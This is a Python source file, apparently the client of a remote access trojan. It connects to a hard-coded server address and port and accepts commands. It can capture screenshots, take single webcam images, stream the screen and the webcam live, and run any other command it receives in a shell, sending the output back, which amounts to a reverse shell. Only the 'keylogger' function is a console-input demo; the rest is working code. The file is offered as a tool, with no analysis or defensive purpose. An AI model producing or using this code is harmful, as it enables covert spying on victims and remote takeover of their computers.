import socket
import subprocess
import os
import sys
import threading
import time

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import cv2
except ImportError:
    cv2 = None

SERVER_IP = "192.168.150.1"  # Your server IP
PORT = 54321

def handle_screenshot(sock):
    if not ImageGrab:
        sock.send(b"ERROR PIL_NOT_FOUND")
        return
    img = ImageGrab.grab()
    from io import BytesIO
    buf = BytesIO()
    img.save(buf, "PNG")
    data = buf.getvalue()
    sock.send(f"SIZE {len(data)}".encode())
    ack = sock.recv(16)
    if ack == b"READY":
        sock.sendall(data)

def handle_camera(sock):
    if not cv2:
        sock.send(b"ERROR OPENCV_NOT_FOUND")
        return
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        sock.send(b"ERROR CAMERA_FAIL")
        return
    ret, buf = cv2.imencode('.jpg', frame)
    data = buf.tobytes()
    sock.send(f"SIZE {len(data)}".encode())
    ack = sock.recv(16)
    if ack == b"READY":
        sock.sendall(data)

def handle_screenshare(sock):
    if not ImageGrab:
        sock.send(b"ERROR PIL_NOT_FOUND")
        return
    try:
        while True:
            img = ImageGrab.grab()
            from io import BytesIO
            buf = BytesIO()
            img.save(buf, "JPEG")
            data = buf.getvalue()
            sock.send(f"FRAME {len(data)}".encode())
            ack = sock.recv(16)
            if ack != b"READY":
                break
            sock.sendall(data)
            resp = sock.recv(16).decode().strip()
            if resp.lower() == "stop":
                break
    except:
        pass

def handle_keylogger(sock):
    """
    Safe demo keylogger: user types input in console, which is sent to server
    """
    print("[*] Safe keylogger demo: type text to send to server. Type 'stop' to finish.")
    all_text = ""
    while True:
        text = input("Type something: ")
        if text.lower() == "stop":
            break
        all_text += text + "\n"
    data = all_text.encode()
    sock.send(f"SIZE {len(data)}".encode())
    ack = sock.recv(16)
    if ack == b"READY":
        sock.sendall(data)

def handle_camera_stream(sock):
    if not cv2:
        sock.send(b"ERROR OPENCV_NOT_FOUND")
        return
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        ret, buf = cv2.imencode('.jpg', frame)
        data = buf.tobytes()
        sock.send(f"CAMFRAME {len(data)}".encode())
        ack = sock.recv(16)
        if ack != b"READY":
            break
        sock.sendall(data)
        resp = sock.recv(16).decode().strip().lower()
        if resp == "stop":
            break
    cap.release()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, PORT))
        while True:
            data = s.recv(8192)
            if not data:
                break
            cmd = data.decode().strip()
            if cmd == "exit":
                break
            elif cmd == "screenshot":
                handle_screenshot(s)
            elif cmd == "camera":
                handle_camera(s)
            elif cmd == "screenshare_start":
                handle_screenshare(s)
            elif cmd == "keylogger":
                handle_keylogger(s)
            elif cmd == "camerastream_start":
                handle_camera_stream(s)
            else:
                # shell command
                try:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    out, err = proc.communicate()
                    s.sendall(out + err)
                except:
                    s.sendall(b"ERROR CMD_FAIL")

if __name__ == "__main__":
    main()
